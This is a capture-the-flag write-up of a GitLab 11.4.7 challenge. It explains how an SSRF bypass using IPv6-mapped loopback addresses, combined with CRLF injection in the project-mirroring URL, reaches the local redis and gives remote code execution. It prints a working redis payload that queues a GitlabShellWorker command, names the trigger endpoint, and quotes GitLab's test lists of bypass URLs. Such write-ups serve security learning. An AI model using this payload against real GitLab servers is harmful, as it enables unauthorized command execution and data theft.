## Task

Task consisted of only two files:  

#### docker-compose.yml
	web:
      image: 'gitlab/gitlab-ce:11.4.7-ce.0'
      restart: always
      hostname: 'gitlab.example.com'
      environment:
        GITLAB_OMNIBUS_CONFIG: |
          external_url 'http://gitlab.example.com'
          redis['bind']='127.0.0.1'
          redis['port']=6379
          gitlab_rails['initial_root_password']=File.read('/steg0_initial_root_password')
      ports:
        - '5080:80'
        - '50443:443'
        - '5022:22'
      volumes:
        - '/srv/gitlab/config:/etc/gitlab'
        - '/srv/gitlab/logs:/var/log/gitlab'
        - '/srv/gitlab/data:/var/opt/gitlab'
        - './steg0_initial_root_password:/steg0_initial_root_password'
        - './flag:/flag:ro'

#### reset.sh

    #!/bin/sh
    echo -n \`head -n1337 /dev/urandom | sha512sum | cut -d' ' -f1\` > steg0\_initial\_root_password

Description went something along the lines of: "You may need an 0day".  
  
So... we had docker-compose that builds gitlab version 11.4.7-ce.0, which at the time of the event was actually second latest, there was some release 5 days before the competition. From docker-compose we can also see that the flag is in filesystem under _/flag_.  
  
At first we thought the description was just a standard teaser, but after briefly looking at the challenge we knew it may actually be the case.  
The only other thing that could be flawed other than gitlab itself is the way of generating _initial\_root\_password._ Which unfortunately I don't believe is the case (at least to my knowledge).  
  

## Clues

Some time later we stumbled upon gitlab blog post describing security issues fixed in the latest release [https://about.gitlab.com/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/](https://about.gitlab.com/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/).  
There was plenty to choose from, our attention was grabbed by one of them which was reported by employee of Chaitin Tech, organizers of the CTF.  
  

[![](https://2.bp.blogspot.com/-xXeW_DWc21Y/XCqZtcbO7oI/AAAAAAAAAPI/o7o4w64xVB0U2nQK8NAo0ialkr-o_ZT4wCLcBGAs/s640/Screenshot%2Bfrom%2B2018-12-31%2B23-35-20.png)](https://2.bp.blogspot.com/-xXeW_DWc21Y/XCqZtcbO7oI/AAAAAAAAAPI/o7o4w64xVB0U2nQK8NAo0ialkr-o_ZT4wCLcBGAs/s1600/Screenshot%2Bfrom%2B2018-12-31%2B23-35-20.png)

  
  
We started to look for any service that is accessible from localhost only and could lead to Arbitrary File Read or RCE.  
Such service happens to be [redis](https://www.google.com/search?q=redis+ssrf). This vector was already used in the past, you can read up on it in [this gitlab issue](https://gitlab.com/gitlab-org/gitlab-ce/issues/41293).  
  
Redis accepts commands in a line based format. There was only one problem - we couldn't break lines in Webhooks URLs.  
We looked at the blogpost once again.  
  

[![](https://4.bp.blogspot.com/-MrAw6YwYoGU/XCtzmugBYeI/AAAAAAAAAPU/zk6nHfI6RrgyL2jFXooDh2ryJ9VCNG5IwCLcBGAs/s640/Screenshot%2Bfrom%2B2019-01-01%2B15-04-53.png)](https://4.bp.blogspot.com/-MrAw6YwYoGU/XCtzmugBYeI/AAAAAAAAAPU/zk6nHfI6RrgyL2jFXooDh2ryJ9VCNG5IwCLcBGAs/s1600/Screenshot%2Bfrom%2B2019-01-01%2B15-04-53.png)

  
  
This looks promising, but it affects different part of code, project mirroring is not Webhooks functionality, or is it?  
Thanks to Gitlab being open source software, and the fact that the new version was already released, we knew somewhere in the [github repository](https://github.com/gitlabhq/gitlabhq) we would find a patch.  
Indeed, we can find both of the bugs fixes.  
  
SSRF: [https://github.com/gitlabhq/gitlabhq/commit/a9f5b22394954be8941566da1cf349bb6a179974](https://github.com/gitlabhq/gitlabhq/commit/a9f5b22394954be8941566da1cf349bb6a179974)  
CRLF: [https://github.com/gitlabhq/gitlabhq/commit/c0e5d9afee57745a79c072b0f57fdcbe164312da](https://github.com/gitlabhq/gitlabhq/commit/c0e5d9afee57745a79c072b0f57fdcbe164312da)  
  
Looking at the SSRF fix, we realized that the code which checks for loopback/local URLs is actually code placed in shared utils, which Project Mirroring uses as well.  
  
At this point, there were about 15 minutes left of the CTF, we had all the parts needed to create exploit, but just not enough time to implement it.  
  

## Exploiting

Knowing all of the above, we can put all the pieces together to create an exploit:  
  

- Use SSRF to access redis in Project Mirroring functionality(_/\<namespace>/\<projectname>/settings/repository#js-push-remote-settings_)**  
Finding out what works is as simple as looking at the [tests](https://github.com/gitlabhq/gitlabhq/commit/a9f5b22394954be8941566da1cf349bb6a179974#diff-e2ebce1cc421d7f032b0067afc51177eR91) written to check for the bug after the fix was deployed.  

	    it 'returns true for loopback IPs' do
	        expect(described_class.blocked_url?('https://[0:0:0:0:0:ffff:127.0.0.1]/foo/foo.git')).to be true
	        expect(described_class.blocked_url?('https://[::ffff:127.0.0.1]/foo/foo.git')).to be true
	        expect(described_class.blocked_url?('https://[::ffff:7f00:1]/foo/foo.git')).to be true
	        expect(described_class.blocked_url?('https://[0:0:0:0:0:ffff:127.0.0.2]/foo/foo.git')).to be true
	        expect(described_class.blocked_url?('https://[::ffff:127.0.0.2]/foo/foo.git')).to be true
	        expect(described_class.blocked_url?('https://[::ffff:7f00:2]/foo/foo.git')).to be true
	    end

- Use CRLFs to inject redis commands.**  
Which is as simple as adding _\\n_ to our URL.  

	    shared_context 'invalid urls' do
		      let(:urls_with_CRLF) do
		        ["http://127.0.0.1:333/pa\rth",
		         "http://127.0.0.1:333/pa\nth",
		         "http://127.0a.0.1:333/pa\r\nth",
		         "http://127.0.0.1:333/path?param=foo\r\nbar",
		         "http://127.0.0.1:333/path?param=foo\rbar",
		         "http://127.0.0.1:333/path?param=foo\nbar",
		         "http://127.0.0.1:333/pa%0dth",
		         "http://127.0.0.1:333/pa%0ath",
		         "http://127.0a.0.1:333/pa%0d%0th",
		         "http://127.0.0.1:333/pa%0D%0Ath",
		         "http://127.0.0.1:333/path?param=foo%0Abar",
		         "http://127.0.0.1:333/path?param=foo%0Dbar",
		         "http://127.0.0.1:333/path?param=foo%0D%0Abar"]
		      end
		    end

Looking at the issue I mentioned earlier we arrive at payload that looks like this:  
  

	git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
	
	multi

	sadd resque:gitlab:queues system_hook_push

	lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami > /tmp/a \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"4552c3b1225428b18682c901\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"

	exec

	exec


Putting that in mirror functionality results in a 500 returned from gitlab. This happens due to gitlab trying to render our URL and in failing to do so, refusing to respond with anything meaningful.  
That's not helpful given that we still need to trigger the mirror by clicking the little refresh button (or just sending POST to _update\_now?sync\_remote=true_)  
  

[![](https://3.bp.blogspot.com/-yArZaTpzzQE/XCupVBrtCMI/AAAAAAAAAPg/1AsdV2vqnDIxeRd35DQW2sd8iBtZ8rFzACLcBGAs/s640/Screenshot%2Bfrom%2B2019-01-01%2B18-54-12.png)](https://3.bp.blogspot.com/-yArZaTpzzQE/XCupVBrtCMI/AAAAAAAAAPg/1AsdV2vqnDIxeRd35DQW2sd8iBtZ8rFzACLcBGAs/s1600/Screenshot%2Bfrom%2B2019-01-01%2B18-54-12.png)


Doing the latter gives us full RCE.
Exploit can be found over here: [exploit.py](exploit.py)

Real World CTF network infrastructure routing didn't allow any connections initiated by gitlab host to LAN or Internet.

To extract the flag, you could use some part of the gitlab interface (icons,popups) to inject flag into it and then read it.
